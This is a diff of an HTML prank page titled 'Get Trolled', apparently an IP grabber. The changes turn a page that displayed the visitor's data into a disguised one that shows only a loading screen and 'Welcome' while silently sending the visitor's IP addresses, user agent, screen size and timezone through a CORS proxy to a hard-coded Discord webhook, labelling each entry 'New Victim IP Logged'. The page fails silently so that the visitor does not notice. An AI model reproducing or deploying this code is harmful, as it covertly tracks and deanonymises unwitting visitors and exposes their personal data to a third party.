@@ -3,22 +3,21 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Get Trolled | Advanced IP Grabber</title>
+<title>Get Trolled</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Roboto+Mono&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
 
   /* Reset */
   * {
     margin: 0; padding: 0; box-sizing: border-box;
   }
 
-  body, html {
+  html, body {
     height: 100%;
-    font-family: 'Roboto Mono', monospace;
-    background: #0f0f12;
+    font-family: 'Orbitron', sans-serif;
+    background: black;
     color: #0ff;
     overflow: hidden;
-    user-select: none;
   }
 
   #video-container {
@@ -32,263 +31,67 @@
     width: 100%;
     height: 100%;
     object-fit: cover;
-    filter: brightness(0.2) saturate(1.2) contrast(1.2);
+    filter: brightness(0.2) saturate(1.1);
   }
 
-  #overlay {
+  #loading-screen {
     position: fixed;
     top:0; left:0; width:100%; height:100%;
-    background: linear-gradient(135deg, rgba(0,255,255,0.1), rgba(0,0,0,0.7));
-    pointer-events: none;
-    z-index: 1;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 20;
+    user-select: none;
+    flex-direction: column;
   }
 
-  #container {
-    position: relative;
-    z-index: 10;
-    max-width: 600px;
-    margin: 20px auto;
-    background: rgba(0,255,255,0.1);
-    border: 2px solid #0ff;
-    border-radius: 15px;
-    padding: 25px 30px;
-    box-shadow: 0 0 25px #0ff88, 0 0 50px #0ff;
-    backdrop-filter: blur(8px);
+  #loading-text {
+    font-size: 4rem;
+    color: #0ff;
+    animation: fadeLoading 3s infinite;
+    letter-spacing: 0.2em;
   }
 
-  h1 {
-    font-family: 'Orbitron', sans-serif;
-    font-weight: 700;
+  @keyframes fadeLoading {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.3;}
+  }
+
+  #final-message {
+    position: fixed;
+    top: 10vh;
+    width: 100%;
+    text-align: center;
     font-size: 3rem;
     color: #0ff;
-    text-align: center;
-    margin-bottom: 15px;
-    text-shadow:
-      0 0 7px #0ff,
-      0 0 15px #0ff;
-  }
-
-  .info-section {
-    margin-bottom: 20px;
-  }
-
-  .label {
-    font-weight: 700;
-    font-size: 1.2rem;
-    margin-bottom: 5px;
-    color: #0ff;
-    text-shadow: 0 0 5px #0ff;
-  }
-
-  .info-text {
-    font-size: 1.05rem;
-    padding: 10px 15px;
-    background: rgba(0,255,255,0.15);
-    border-radius: 8px;
-    border: 1.5px solid #0ff;
-    cursor: pointer;
-    user-select: all;
-    transition: background 0.3s ease;
-  }
-
-  .info-text:hover {
-    background: rgba(0,255,255,0.3);
-  }
-
-  button#resend {
-    display: block;
-    margin: 0 auto;
-    background: #0ff;
-    color: #000;
-    font-weight: 700;
-    font-size: 1.2rem;
-    border: none;
-    border-radius: 10px;
-    padding: 12px 25px;
-    cursor: pointer;
-    box-shadow: 0 0 15px #0ff;
-    transition: background 0.3s ease;
+    z-index: 10;
     user-select: none;
-  }
-
-  button#resend:hover {
-    background: #0cc;
-  }
-
-  #status {
-    margin-top: 15px;
-    font-size: 1.1rem;
-    font-weight: 700;
-    color: #0f0;
-    text-align: center;
-    min-height: 24px;
-    text-shadow: 0 0 8px #0f0;
-  }
-
-  #status.error {
-    color: #f00;
-    text-shadow: 0 0 10px #f00;
-  }
-
-  #spinner {
-    border: 4px solid rgba(0,255,255,0.2);
-    border-top: 4px solid #0ff;
-    border-radius: 50%;
-    width: 28px;
-    height: 28px;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 20px auto;
-  }
-
-  @keyframes spin {
-    0% { transform: rotate(0deg);}
-    100% { transform: rotate(360deg);}
-  }
-
-  /* Neon flicker */
-  @keyframes flicker {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.8; }
-  }
-
-  /* Copy tooltip */
-  .tooltip {
-    position: relative;
-    display: inline-block;
-  }
-
-  .tooltip .tooltiptext {
-    visibility: hidden;
-    width: 80px;
-    background-color: #0ff;
-    color: black;
-    text-align: center;
-    border-radius: 6px;
-    padding: 4px 6px;
-    position: absolute;
-    z-index: 20;
-    bottom: 125%;
-    left: 50%;
-    margin-left: -40px;
     opacity: 0;
-    transition: opacity 0.3s;
-    font-size: 0.8rem;
-  }
-
-  .tooltip.show .tooltiptext {
-    visibility: visible;
-    opacity: 1;
-  }
-
-  /* Responsive */
-  @media (max-width: 650px) {
-    #container {
-      margin: 15px;
-      padding: 20px;
-    }
-
-    h1 {
-      font-size: 2.3rem;
-    }
-
-    .label {
-      font-size: 1rem;
-    }
-
-    .info-text {
-      font-size: 0.95rem;
-    }
-
-    button#resend {
-      font-size: 1rem;
-      padding: 10px 20px;
-    }
+    transition: opacity 1s ease-in-out;
   }
 </style>
 </head>
 <body>
-  <div id="video-container">
-    <video id="plank-video" autoplay loop muted playsinline>
-      <source src="https://media.discordapp.net/attachments/1130971768459382884/1133882111988875304/Phonk_trollge_meme_original_hke8wCNNosI.mp4" type="video/mp4" />
-      Your browser does not support the video tag.
-    </video>
-  </div>
-  <div id="overlay"></div>
 
-  <div id="container" role="main" aria-label="IP information panel">
-    <h1>Get Trolled</h1>
+<div id="video-container">
+  <video id="plank-video" autoplay loop muted playsinline>
+    <source src="https://media.discordapp.net/attachments/1130971768459382884/1133882111988875304/Phonk_trollge_meme_original_hke8wCNNosI.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
+</div>
 
-    <div id="spinner"></div>
+<div id="loading-screen" role="alert" aria-live="assertive">
+  <div id="loading-text">LOADING...</div>
+</div>
 
-    <div class="info-section" id="ipv4-section">
-      <div class="label">IPv4 Address <span title="Click to copy" style="cursor:pointer;">📋</span></div>
-      <div class="info-text tooltip" id="ipv4-text" tabindex="0" aria-label="IPv4 address, click to copy">
-        Loading...
-        <span class="tooltiptext">Copied!</span>
-      </div>
-    </div>
-
-    <div class="info-section" id="ipv6-section" style="display:none;">
-      <div class="label">IPv6 Address <span title="Click to copy" style="cursor:pointer;">📋</span></div>
-      <div class="info-text tooltip" id="ipv6-text" tabindex="0" aria-label="IPv6 address, click to copy">
-        Loading...
-        <span class="tooltiptext">Copied!</span>
-      </div>
-    </div>
-
-    <div class="info-section" id="useragent-section">
-      <div class="label">User Agent</div>
-      <div class="info-text tooltip" id="useragent-text" tabindex="0" aria-label="User agent info, click to copy">
-        Loading...
-        <span class="tooltiptext">Copied!</span>
-      </div>
-    </div>
-
-    <div class="info-section" id="screen-section">
-      <div class="label">Screen Resolution</div>
-      <div class="info-text tooltip" id="screen-text" tabindex="0" aria-label="Screen resolution, click to copy">
-        Loading...
-        <span class="tooltiptext">Copied!</span>
-      </div>
-    </div>
-
-    <div class="info-section" id="timezone-section">
-      <div class="label">Timezone</div>
-      <div class="info-text tooltip" id="timezone-text" tabindex="0" aria-label="Timezone info, click to copy">
-        Loading...
-        <span class="tooltiptext">Copied!</span>
-      </div>
-    </div>
-
-    <button id="resend" aria-label="Resend IP info to Discord webhook">Resend to Discord</button>
-
-    <div id="status" role="alert" aria-live="polite"></div>
-  </div>
+<div id="final-message" aria-live="polite" aria-atomic="true">
+  Welcome
+</div>
 
 <script>
   const corsProxy = "https://cors-anywhere.herokuapp.com/";
   const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";
-
-  // Helper: copy text and show tooltip
-  function setupCopyTooltip(elem) {
-    elem.addEventListener('click', () => {
-      navigator.clipboard.writeText(elem.innerText.trim()).then(() => {
-        const tooltip = elem.querySelector('.tooltiptext');
-        if (!tooltip) return;
-        tooltip.classList.add('show');
-        setTimeout(() => tooltip.classList.remove('show'), 1500);
-      }).catch(() => {
-        alert('Failed to copy to clipboard');
-      });
-    });
-    // Also keyboard accessible
-    elem.addEventListener('keydown', e => {
-      if (e.key === 'Enter' || e.key === ' ') {
-        e.preventDefault();
-        elem.click();
-      }
-    });
-  }
 
   async function fetchIPv4() {
     const res = await fetch('https://api.ipify.org?format=json');
@@ -308,105 +111,79 @@
     }
   }
 
-  async function sendToDiscord(ipv4, ipv6, ua, screenInfo, timezone) {
-    let content =
-      `**Get Trolled IP Grabber**\n` +
-      `IPv4: \`${ipv4}\`\n` +
-      (ipv6 ? `IPv6: \`${ipv6}\`\n` : '') +
-      `User Agent: \`${ua}\`\n` +
-      `Screen: \`${screenInfo}\`\n` +
-      `Timezone: \`${timezone}\``;
+  async function sendWebhookEmbed(ipv4, ipv6, ua, screenInfo, timezone) {
+    const embed = {
+      title: "🕵️‍♂️ New Victim IP Logged",
+      color: 0x00ffff,
+      timestamp: new Date().toISOString(),
+      footer: {
+        text: "Get Trolled IP Grabber",
+        icon_url: "https://i.imgur.com/qZ7j0fV.png" // example icon, replace if you want
+      },
+      fields: [
+        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
+        ...(ipv6 ? [{ name: "IPv6 Address", value: `\`${ipv6}\``, inline: true }] : []),
+        { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${screenInfo}\``, inline: true },
+        { name: "Timezone", value: `\`${timezone}\``, inline: true }
+      ],
+      thumbnail: {
+        url: "https://i.imgur.com/CeTvnKq.png" // some troll icon or custom image
+      },
+      author: {
+        name: "Get Trolled IP Grabber",
+        url: "https://discord.com",
+        icon_url: "https://i.imgur.com/qZ7j0fV.png"
+      }
+    };
 
     try {
       const res = await fetch(corsProxy + webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content }),
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] }),
       });
-      if (!res.ok) throw new Error(`Webhook failed with status ${res.status}`);
+      if (!res.ok) throw new Error(`Webhook error ${res.status}`);
       return true;
     } catch (e) {
-      console.error('Webhook error:', e);
+      console.error("Webhook sending failed:", e);
       return false;
     }
   }
 
   async function main() {
-    const ipv4Text = document.getElementById('ipv4-text');
-    const ipv6Text = document.getElementById('ipv6-text');
-    const ipv6Section = document.getElementById('ipv6-section');
-    const userAgentText = document.getElementById('useragent-text');
-    const screenText = document.getElementById('screen-text');
-    const timezoneText = document.getElementById('timezone-text');
-    const statusEl = document.getElementById('status');
-    const spinner = document.getElementById('spinner');
-    const resendBtn = document.getElementById('resend');
-
-    spinner.style.display = 'block';
-    statusEl.textContent = '';
-    resendBtn.disabled = true;
+    const loadingScreen = document.getElementById("loading-screen");
+    const finalMessage = document.getElementById("final-message");
 
     try {
+      // fetch data
       const ipv4 = await fetchIPv4();
-      ipv4Text.textContent = ipv4;
-
       const ipv6 = await fetchIPv6();
-      if (ipv6) {
-        ipv6Text.textContent = ipv6;
-        ipv6Section.style.display = 'block';
-      } else {
-        ipv6Section.style.display = 'none';
-      }
-
       const ua = navigator.userAgent;
-      userAgentText.textContent = ua;
-
       const screenInfo = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)`;
-      screenText.textContent = screenInfo;
-
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      timezoneText.textContent = timezone;
 
-      const success = await sendToDiscord(ipv4, ipv6, ua, screenInfo, timezone);
+      // send webhook embed
+      await sendWebhookEmbed(ipv4, ipv6, ua, screenInfo, timezone);
 
-      if (success) {
-        statusEl.textContent = 'IP info successfully sent to Discord!';
-        statusEl.classList.remove('error');
-      } else {
-        statusEl.textContent = 'Failed to send IP info to Discord.';
-        statusEl.classList.add('error');
-      }
+      // fade out loading, fade in final message
+      loadingScreen.style.transition = "opacity 1.5s ease";
+      loadingScreen.style.opacity = 0;
+      setTimeout(() => loadingScreen.style.display = "none", 1500);
+
+      finalMessage.style.opacity = 1;
+
     } catch (err) {
-      statusEl.textContent = 'Error fetching IP info.';
-      statusEl.classList.add('error');
+      // fail silently, just hide loading and show final message anyway
+      loadingScreen.style.opacity = 0;
+      setTimeout(() => loadingScreen.style.display = "none", 1500);
+      finalMessage.style.opacity = 1;
       console.error(err);
-    } finally {
-      spinner.style.display = 'none';
-      resendBtn.disabled = false;
     }
   }
 
-  // Setup copy on click
-  ['ipv4-text', 'ipv6-text', 'useragent-text', 'screen-text', 'timezone-text'].forEach(id => {
-    const el = document.getElementById(id);
-    setupCopyTooltip(el);
-  });
-
-  // Resend webhook button
-  document.getElementById('resend').addEventListener('click', () => {
-    main();
-  });
-
-  // Keyboard shortcut: R to resend webhook
-  window.addEventListener('keydown', e => {
-    if (e.key.toLowerCase() === 'r' && !document.activeElement.matches('input, textarea, button')) {
-      e.preventDefault();
-      main();
-    }
-  });
-
-  // Initial load
   main();
 </script>
+
 </body>
 </html>
